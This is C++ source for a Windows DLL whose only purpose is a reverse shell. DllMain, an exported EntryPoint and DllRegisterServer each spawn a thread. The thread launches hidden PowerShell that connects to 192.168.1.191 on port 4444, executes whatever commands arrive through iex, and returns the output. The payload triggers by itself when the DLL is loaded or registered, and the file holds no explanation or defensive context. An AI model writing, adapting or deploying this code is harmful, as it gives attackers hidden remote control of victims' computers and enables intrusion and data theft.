#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "pch.h"
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <shellapi.h> 
#pragma comment(lib, "ws2_32.lib")

DWORD WINAPI ReverseShell(LPVOID lpParam) {
    // Comando PowerShell que abre conexão reversa e envia/recebe comandos
    const wchar_t* psCommand =
        L"-nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.191',4444);"
        L"$stream = $client.GetStream();"
        L"[byte[]]$bytes = 0..65535|%{0};"
        L"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {"
        L"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        L"$sendback = (iex $data 2>&1 | Out-String);"
        L"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        L"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        L"$stream.Write($sendbyte,0,$sendbyte.Length);"
        L"$stream.Flush()"
        L"}\"";

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"open";
    sei.lpFile = L"powershell.exe";
    sei.lpParameters = psCommand;
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void EntryPoint() {
    CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
}
extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer(void) {
    CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
    return S_OK;
}
